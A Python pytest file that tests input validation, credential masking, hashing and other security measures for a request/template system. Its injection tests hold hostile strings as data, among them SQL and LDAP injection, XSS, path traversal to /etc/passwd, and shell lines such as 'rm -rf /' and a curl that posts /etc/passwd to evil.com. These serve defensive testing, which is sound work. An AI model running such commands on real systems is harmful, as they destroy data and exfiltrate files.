"""Comprehensive security validation tests."""

import base64
import hashlib
import json
import re
import secrets

import pytest

# Import components for security testing
try:
    from domain.request.aggregate import Request
    from domain.request.exceptions import RequestValidationError
    from domain.template.aggregate import Template
    from domain.template.exceptions import TemplateValidationError

    IMPORTS_AVAILABLE = True
except ImportError as e:
    IMPORTS_AVAILABLE = False
    pytestmark = pytest.mark.skip(f"Security test imports not available: {e}")


@pytest.mark.security
class TestInputValidationSecurity:
    """Test input validation security measures."""

    def test_sql_injection_prevention_in_template_id(self):
        """Test prevention of SQL injection in template IDs."""
        sql_injection_attempts = [
            "'; DROP TABLE requests; --",
            "template' OR '1'='1",
            "template'; DELETE FROM templates; --",
            "template' UNION SELECT * FROM users --",
            'template"; DROP TABLE requests; --',
            "template' AND (SELECT COUNT(*) FROM requests) > 0 --",
        ]

        for malicious_input in sql_injection_attempts:
            try:
                request = Request.create_new_request(
                    template_id=malicious_input,
                    machine_count=1,
                    requester_id="test-user",
                )

                # If creation succeeds, template_id should be sanitized
                assert "DROP" not in request.template_id.upper()
                assert "DELETE" not in request.template_id.upper()
                assert "UNION" not in request.template_id.upper()
                assert "--" not in request.template_id

            except RequestValidationError:
                # Acceptable - input validation rejected malicious input
                pass

    def test_xss_prevention_in_user_inputs(self):
        """Test prevention of XSS attacks in user inputs."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<%2Fscript%3E%3Cscript%3Ealert('XSS')%3C%2Fscript%3E",
        ]

        for xss_payload in xss_payloads:
            try:
                request = Request.create_new_request(
                    template_id="test-template",
                    machine_count=1,
                    requester_id=xss_payload,
                )

                # If creation succeeds, input should be sanitized
                assert "<script>" not in request.requester_id.lower()
                assert "javascript:" not in request.requester_id.lower()
                assert "alert(" not in request.requester_id.lower()
                assert "<iframe" not in request.requester_id.lower()

            except RequestValidationError:
                # Acceptable - input validation rejected XSS payload
                pass

    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks."""
        command_injection_attempts = [
            "template; rm -rf /",
            "template && cat /etc/passwd",
            "template | nc attacker.com 4444",
            "template; wget http://evil.com/malware.sh",
            "template`whoami`",
            "template$(id)",
            "template; python -c 'import os; os.system(\"rm -rf /\")'",
            "template; curl -X POST http://evil.com/steal -d @/etc/passwd",
        ]

        for malicious_input in command_injection_attempts:
            try:
                request = Request.create_new_request(
                    template_id=malicious_input,
                    machine_count=1,
                    requester_id="test-user",
                )

                # If creation succeeds, input should be sanitized
                assert "rm -rf" not in request.template_id
                assert "cat /etc" not in request.template_id
                assert "wget" not in request.template_id
                assert "curl" not in request.template_id
                assert "`" not in request.template_id
                assert "$(" not in request.template_id

            except RequestValidationError:
                # Acceptable - input validation rejected malicious input
                pass

    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/var/log/../../etc/passwd",
            "template/../../../etc/passwd",
        ]

        for malicious_path in path_traversal_attempts:
            try:
                request = Request.create_new_request(
                    template_id=malicious_path,
                    machine_count=1,
                    requester_id="test-user",
                )

                # If creation succeeds, path should be sanitized
                assert "../" not in request.template_id
                assert "..\\" not in request.template_id
                assert "/etc/passwd" not in request.template_id
                assert "system32" not in request.template_id.lower()

            except RequestValidationError:
                # Acceptable - input validation rejected path traversal
                pass

    def test_ldap_injection_prevention(self):
        """Test prevention of LDAP injection attacks."""
        ldap_injection_attempts = [
            "user)(|(password=*))",
            "user)(&(password=*)(cn=*))",
            "user*)(|(cn=*))",
            "user)(objectClass=*)",
            "user))(|(cn=admin",
            "user*)(uid=*)(|(cn=*",
        ]

        for malicious_input in ldap_injection_attempts:
            try:
                request = Request.create_new_request(
                    template_id="test-template",
                    machine_count=1,
                    requester_id=malicious_input,
                )

                # If creation succeeds, input should be sanitized
                assert ")(" not in request.requester_id
                assert "objectClass" not in request.requester_id
                assert "password=*" not in request.requester_id

            except RequestValidationError:
                # Acceptable - input validation rejected LDAP injection
                pass


@pytest.mark.security
class TestAuthenticationSecurity:
    """Test authentication and authorization security."""

    def test_request_authorization_validation(self):
        """Test that requests are properly authorized."""
        # Test with valid user
        valid_request = Request.create_new_request(
            template_id="test-template", machine_count=1, requester_id="authorized-user"
        )
        assert valid_request.requester_id == "authorized-user"

        # Test with empty requester (should fail)
        with pytest.raises(RequestValidationError):
            Request.create_new_request(
                template_id="test-template", machine_count=1, requester_id=""
            )

        # Test with None requester (should fail)
        with pytest.raises(RequestValidationError):
            Request.create_new_request(
                template_id="test-template", machine_count=1, requester_id=None
            )

    def test_template_access_control(self):
        """Test template access control mechanisms."""
        # Test template creation with appropriate validation
        template = Template(
            template_id="secure-template",
            name="Secure Template",
            provider_api="RunInstances",
            image_id="ami-12345678",
            instance_type="t2.micro",
        )

        assert template.template_id == "secure-template"

        # Test template with invalid/malicious data
        with pytest.raises(TemplateValidationError):
            Template(
                template_id="",  # Empty template ID
                name="Invalid Template",
                provider_api="RunInstances",
                image_id="ami-12345678",
                instance_type="t2.micro",
            )

    def test_session_security(self):
        """Test session security measures."""
        # Mock session data
        mock_session = {
            "user_id": "test-user",
            "session_token": secrets.token_urlsafe(32),
            "created_at": "2025-01-01T00:00:00Z",
            "expires_at": "2025-01-01T01:00:00Z",
        }

        # Session token should be cryptographically secure
        assert len(mock_session["session_token"]) >= 32
        assert (
            mock_session["session_token"].isalnum()
            or "-" in mock_session["session_token"]
            or "_" in mock_session["session_token"]
        )

        # Session should have expiration
        assert "expires_at" in mock_session
        assert mock_session["expires_at"] is not None

    def test_credential_handling_security(self):
        """Test secure credential handling."""
        # Test that credentials are not logged or exposed
        sensitive_data = {
            "aws_access_key": "AKIAIOSFODNN7EXAMPLE",
            "aws_secret_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
            "password": "super_secret_password",
            "api_key": "sk-1234567890abcdef",
        }

        # Simulate credential masking
        def mask_sensitive_data(data):
            masked = {}
            for key, value in data.items():
                if any(
                    sensitive_word in key.lower()
                    for sensitive_word in ["key", "password", "secret", "token"]
                ):
                    masked[key] = "*" * len(value) if len(value) > 4 else "****"
                else:
                    masked[key] = value
            return masked

        masked_data = mask_sensitive_data(sensitive_data)

        # Verify sensitive data is masked
        assert masked_data["aws_access_key"] == "********************"
        assert masked_data["aws_secret_key"] == "****************************************"
        assert masked_data["password"] == "*********************"
        assert masked_data["api_key"] == "********************"


@pytest.mark.security
class TestDataProtectionSecurity:
    """Test data protection and privacy security."""

    def test_sensitive_data_masking_in_logs(self):
        """Test that sensitive data is masked in logs."""
        # Simulate log entry with sensitive data
        log_entry = {
            "message": "User login attempt",
            "user_id": "test-user",
            "password": "secret123",
            "aws_access_key": "AKIAIOSFODNN7EXAMPLE",
            "request_data": {
                "template_id": "template-1",
                "api_key": "sk-1234567890abcdef",
            },
        }

        def mask_log_entry(entry):
            """Mask sensitive data in log entries."""
            if isinstance(entry, dict):
                masked = {}
                for key, value in entry.items():
                    if any(
                        sensitive in key.lower()
                        for sensitive in ["password", "key", "secret", "token"]
                    ):
                        masked[key] = "[MASKED]"
                    elif isinstance(value, dict):
                        masked[key] = mask_log_entry(value)
                    else:
                        masked[key] = value
                return masked
            return entry

        masked_entry = mask_log_entry(log_entry)

        # Verify sensitive data is masked
        assert masked_entry["password"] == "[MASKED]"
        assert masked_entry["aws_access_key"] == "[MASKED]"
        assert masked_entry["request_data"]["api_key"] == "[MASKED]"
        assert masked_entry["user_id"] == "test-user"  # Non-sensitive data preserved

    def test_data_encryption_at_rest(self):
        """Test data encryption at rest."""
        # Simulate data encryption
        sensitive_data = "This is sensitive request data"

        # Simple encryption simulation (in practice, use appropriate encryption)
        def encrypt_data(data: str, key: bytes) -> str:
            """Simple XOR encryption for testing."""
            encrypted = bytearray()
            for i, byte in enumerate(data.encode()):
                encrypted.append(byte ^ key[i % len(key)])
            return base64.b64encode(encrypted).decode()

        def decrypt_data(encrypted_data: str, key: bytes) -> str:
            """Simple XOR decryption for testing."""
            encrypted_bytes = base64.b64decode(encrypted_data.encode())
            decrypted = bytearray()
            for i, byte in enumerate(encrypted_bytes):
                decrypted.append(byte ^ key[i % len(key)])
            return decrypted.decode()

        # Generate encryption key
        encryption_key = secrets.token_bytes(32)

        # Encrypt data
        encrypted_data = encrypt_data(sensitive_data, encryption_key)

        # Verify data is encrypted (not readable)
        assert encrypted_data != sensitive_data
        assert "sensitive" not in encrypted_data.lower()

        # Verify data can be decrypted
        decrypted_data = decrypt_data(encrypted_data, encryption_key)
        assert decrypted_data == sensitive_data

    def test_pii_data_handling(self):
        """Test handling of Personally Identifiable Information (PII)."""
        # Test data with potential PII
        request_data = {
            "requester_id": "john.doe@company.com",
            "template_id": "template-1",
            "machine_count": 2,
            "metadata": {
                "user_email": "john.doe@company.com",
                "phone_number": "+1-555-123-4567",
                "ssn": "123-45-6789",
                "credit_card": "4111-1111-1111-1111",
            },
        }

        def detect_pii(data):
            """Detect potential PII in data."""
            pii_patterns = {
                "email": r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b",
                "phone": r"\+?1?-?\(?[0-9]{3}\)?-?[0-9]{3}-?[0-9]{4}",
                "ssn": r"\b\d{3}-\d{2}-\d{4}\b",
                "credit_card": r"\b\d{4}-\d{4}-\d{4}-\d{4}\b",
            }

            detected_pii = []

            def scan_value(value, path=""):
                if isinstance(value, str):
                    for pii_type, pattern in pii_patterns.items():
                        if re.search(pattern, value):
                            detected_pii.append({"type": pii_type, "path": path, "value": value})
                elif isinstance(value, dict):
                    for key, val in value.items():
                        scan_value(val, f"{path}.{key}" if path else key)
                elif isinstance(value, list):
                    for i, val in enumerate(value):
                        scan_value(val, f"{path}[{i}]" if path else f"[{i}]")

            scan_value(data)
            return detected_pii

        # Detect PII in request data
        detected_pii = detect_pii(request_data)

        # Should detect PII
        assert len(detected_pii) > 0

        # Verify specific PII types are detected
        pii_types = [item["type"] for item in detected_pii]
        assert "email" in pii_types
        assert "phone" in pii_types
        assert "ssn" in pii_types
        assert "credit_card" in pii_types

    def test_data_sanitization(self):
        """Test data sanitization processes."""
        # Test data with various potentially harmful content
        unsanitized_data = {
            "template_id": '<script>alert("xss")</script>template-1',
            "requester_id": "user@domain.com; DROP TABLE users;",
            "metadata": {
                "description": "Template with <img src=x onerror=alert(1)> embedded",
                "notes": "Contains ../../../etc/passwd path traversal",
            },
        }

        def sanitize_data(data):
            """Sanitize data by removing potentially harmful content."""
            if isinstance(data, str):
                # Remove HTML tags
                sanitized = re.sub(r"<[^>]*>", "", data)
                # Remove SQL injection patterns
                sanitized = re.sub(
                    r";\s*(DROP|DELETE|INSERT|UPDATE|SELECT)",
                    "",
                    sanitized,
                    flags=re.IGNORECASE,
                )
                # Remove path traversal patterns
                sanitized = re.sub(r"\.\./", "", sanitized)
                # Remove JavaScript patterns
                sanitized = re.sub(r"javascript:", "", sanitized, flags=re.IGNORECASE)
                return sanitized
            elif isinstance(data, dict):
                return {key: sanitize_data(value) for key, value in data.items()}
            elif isinstance(data, list):
                return [sanitize_data(item) for item in data]
            else:
                return data

        sanitized_data = sanitize_data(unsanitized_data)

        # Verify harmful content is removed
        assert "<script>" not in sanitized_data["template_id"]
        assert "DROP TABLE" not in sanitized_data["requester_id"]
        assert "<img" not in sanitized_data["metadata"]["description"]
        assert "../" not in sanitized_data["metadata"]["notes"]


@pytest.mark.security
class TestCryptographicSecurity:
    """Test cryptographic security measures."""

    def test_secure_random_generation(self):
        """Test secure random number generation."""
        # Generate multiple random values
        random_values = []
        for _ in range(100):
            random_value = secrets.token_urlsafe(32)
            random_values.append(random_value)

        # All values should be unique
        assert len(set(random_values)) == len(random_values)

        # Values should be of expected length
        for value in random_values:
            assert len(value) >= 32
            # Should contain only URL-safe characters
            assert all(c.isalnum() or c in "-_" for c in value)

    def test_password_hashing_security(self):
        """Test secure password hashing."""
        passwords = ["password123", "super_secret", "complex!P@ssw0rd"]

        def hash_password(password: str) -> str:
            """Hash password using secure method."""
            # Use SHA-256 with salt (in practice, use bcrypt or similar)
            salt = secrets.token_bytes(32)
            password_hash = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 100000)
            return base64.b64encode(salt + password_hash).decode()

        def verify_password(password: str, hashed: str) -> bool:
            """Verify password against hash."""
            decoded = base64.b64decode(hashed.encode())
            salt = decoded[:32]
            stored_hash = decoded[32:]
            password_hash = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 100000)
            return password_hash == stored_hash

        for password in passwords:
            # Hash password
            hashed = hash_password(password)

            # Verify hash properties
            assert hashed != password  # Hash should not be plaintext
            assert len(hashed) > len(password)  # Hash should be longer

            # Verify password verification works
            assert verify_password(password, hashed)
            assert not verify_password("wrong_password", hashed)

            # Same password should produce different hashes (due to salt)
            hashed2 = hash_password(password)
            assert hashed != hashed2

    def test_secure_token_generation(self):
        """Test secure token generation for sessions/API keys."""
        # Generate tokens
        tokens = []
        for _ in range(50):
            token = secrets.token_urlsafe(64)
            tokens.append(token)

        # All tokens should be unique
        assert len(set(tokens)) == len(tokens)

        # Tokens should have sufficient entropy
        for token in tokens:
            assert len(token) >= 64
            # Should not contain predictable patterns
            assert not re.search(r"(.)\1{3,}", token)  # No 4+ repeated characters
            assert not re.search(r"(..)\1{2,}", token)  # No 3+ repeated pairs

    def test_data_integrity_verification(self):
        """Test data integrity verification using checksums."""
        test_data = [
            "This is test data for integrity verification",
            json.dumps({"template_id": "template-1", "machine_count": 2}),
            "Binary data: " + "x" * 1000,
        ]

        def calculate_checksum(data: str) -> str:
            """Calculate SHA-256 checksum of data."""
            return hashlib.sha256(data.encode()).hexdigest()

        def verify_integrity(data: str, expected_checksum: str) -> bool:
            """Verify data integrity using checksum."""
            actual_checksum = calculate_checksum(data)
            return actual_checksum == expected_checksum

        for data in test_data:
            # Calculate checksum
            checksum = calculate_checksum(data)

            # Verify integrity
            assert verify_integrity(data, checksum)

            # Verify tampered data fails verification
            tampered_data = data + " tampered"
            assert not verify_integrity(tampered_data, checksum)

            # Checksum should be consistent
            checksum2 = calculate_checksum(data)
            assert checksum == checksum2


@pytest.mark.security
class TestSecurityConfiguration:
    """Test security configuration and hardening."""

    def test_secure_defaults(self):
        """Test that secure defaults are used."""
        # Test default request creation
        request = Request.create_new_request(
            template_id="test-template", machine_count=1, requester_id="test-user"
        )

        # Should have secure defaults
        assert request.priority >= 1  # Should have minimum priority
        assert request.timeout is None or request.timeout > 0  # Positive timeout if set

        # Test default template creation
        template = Template(
            template_id="test-template",
            name="Test Template",
            provider_api="RunInstances",
            image_id="ami-12345678",
            instance_type="t2.micro",
        )

        # Should have secure defaults
        assert template.max_number is None or template.max_number > 0

    def test_security_headers_simulation(self):
        """Test security headers that would be used in HTTP responses."""
        # Simulate security headers for API responses
        security_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Content-Security-Policy": "default-src 'self'",
            "Referrer-Policy": "strict-origin-when-cross-origin",
            "Permissions-Policy": "geolocation=(), microphone=(), camera=()",
        }

        # Verify all important security headers are present
        required_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Content-Security-Policy",
        ]

        for header in required_headers:
            assert header in security_headers
            assert security_headers[header] is not None
            assert len(security_headers[header]) > 0

    def test_rate_limiting_simulation(self):
        """Test rate limiting mechanisms."""
        # Simulate rate limiting
        rate_limits = {
            "requests_per_minute": 60,
            "requests_per_hour": 1000,
            "burst_limit": 10,
        }

        # Simulate request tracking
        request_history = []
        current_time = 1640995200  # Mock timestamp

        def is_rate_limited(user_id: str, current_timestamp: int) -> bool:
            """Check if user is rate limited."""
            # Count requests in last minute
            minute_ago = current_timestamp - 60
            recent_requests = [
                req
                for req in request_history
                if req["user_id"] == user_id and req["timestamp"] > minute_ago
            ]

            return len(recent_requests) >= rate_limits["requests_per_minute"]

        # Test rate limiting
        user_id = "test-user"

        # Should not be rate limited initially
        assert not is_rate_limited(user_id, current_time)

        # Add requests to history
        for i in range(rate_limits["requests_per_minute"]):
            request_history.append({"user_id": user_id, "timestamp": current_time + i})

        # Should be rate limited after exceeding limit
        assert is_rate_limited(user_id, current_time + rate_limits["requests_per_minute"])

    def test_input_length_limits(self):
        """Test input length limits for security."""
        # Test various input length limits
        max_lengths = {
            "template_id": 100,
            "requester_id": 100,
            "machine_count": 10000,  # Reasonable upper limit
            "metadata_size": 10000,  # Total metadata size limit
        }

        # Test template_id length limit
        long_template_id = "a" * (max_lengths["template_id"] + 1)
        try:
            request = Request.create_new_request(
                template_id=long_template_id, machine_count=1, requester_id="test-user"
            )
            # If creation succeeds, should be truncated or validated
            assert len(request.template_id) <= max_lengths["template_id"]
        except RequestValidationError:
            # Acceptable - input validation rejected long input
            pass

        # Test machine_count upper limit
        with pytest.raises(RequestValidationError):
            Request.create_new_request(
                template_id="test-template",
                machine_count=max_lengths["machine_count"] + 1,
                requester_id="test-user",
            )

        # Test requester_id length limit
        long_requester_id = "a" * (max_lengths["requester_id"] + 1)
        try:
            request = Request.create_new_request(
                template_id="test-template",
                machine_count=1,
                requester_id=long_requester_id,
            )
            # If creation succeeds, should be truncated or validated
            assert len(request.requester_id) <= max_lengths["requester_id"]
        except RequestValidationError:
            # Acceptable - input validation rejected long input
            pass
